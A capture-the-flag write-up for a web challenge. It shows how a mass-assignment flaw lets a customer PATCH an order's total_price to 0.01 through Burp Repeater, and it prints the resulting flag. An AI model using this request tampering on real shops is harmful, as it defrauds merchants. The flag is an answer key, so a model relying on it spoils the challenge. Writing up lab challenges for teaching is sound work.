# Cheesy Does It
## My favourite bug is mass assignment.

### Step 1 — Identify the vulnerability

The challenge hint says:

“My favourite bug is mass assignment.”

So we're looking for an API endpoint that allows us to modify fields we normally shouldn't control.

### Step 2 — Register an account

Create a normal account on the challenge website.

For example:
```
Username: fashil
Email: fashil@mail.com
Password: qwerty
```
The /api/register endpoint was not the useful endpoint because adding:
```
"role": "admin"
```
didn't give us admin privileges.

### Step 3 — Place an order

Log into the application and:

Browse the products.
Add any product to the cart.
Open the cart.
Proceed to checkout.
Enter the required delivery information.
Place the order.

You should then have an order such as:

/api/orders/1
Step 4 — Inspect the order API

Open Burp Suite → Proxy → HTTP history.

Find the request:
```
GET /api/orders/1
```
The response showed fields including:
```json
{
  "user_id": 4,
  "total_price": 13.99,
  "status": "preparing",
  "delivery_address": "...",
  "phone": "1234567890",
  "payment_method": "card",
  "notes": "",
  "coupon_code": null,
  "points_used": 0,
  "discount_total": 0
}
```
The important field is:
```json
total_price
```
A normal customer should not be able to arbitrarily change the price of an existing order.

### Step 5 — Find the update endpoint

While viewing the order page, the application makes an order-update request.

Send the request to Burp Repeater.

Change it to:
```
PATCH /api/orders/1
```
Make sure the request contains:
```
Content-Type: application/json
```
### Step 6 — Test mass assignment

In the request body, change/add:
```json
{
  "total_price": 0.01
}
```
Then click Send.

The vulnerable application accepts the field.

You should receive a response similar to:
```json
{
  "message": "Order updated successfully",
  "order": {
    "id": 1,
    "user_id": 4,
    "total_price": 0.01,
    ...
  },
  "flag": "bug{...}"
}
```
#### Step 7 — Read the flag

The server directly includes the flag in the successful response:
```
flag: bug{CyhxWJ8hINEPD5b1QpgOFOzv8mXBAoVi}
```
Attack flow
Register account
       ↓
Place an order
       ↓
Find GET /api/orders/1
       ↓
Discover order fields
       ↓
Find PATCH /api/orders/1
       ↓
Send {"total_price":0.01}
       ↓
Server accepts unauthorized field
       ↓
Mass Assignment confirmed
       ↓
Response contains flag

Flag:
```
bug{CyhxWJ8hINEPD5b1QpgOFOzv8mXBAoVi}
```
The key lesson is: don't assume mass assignment always means role=admin. In this challenge, the vulnerable property was total_price, an order attribute that should have been controlled by the server.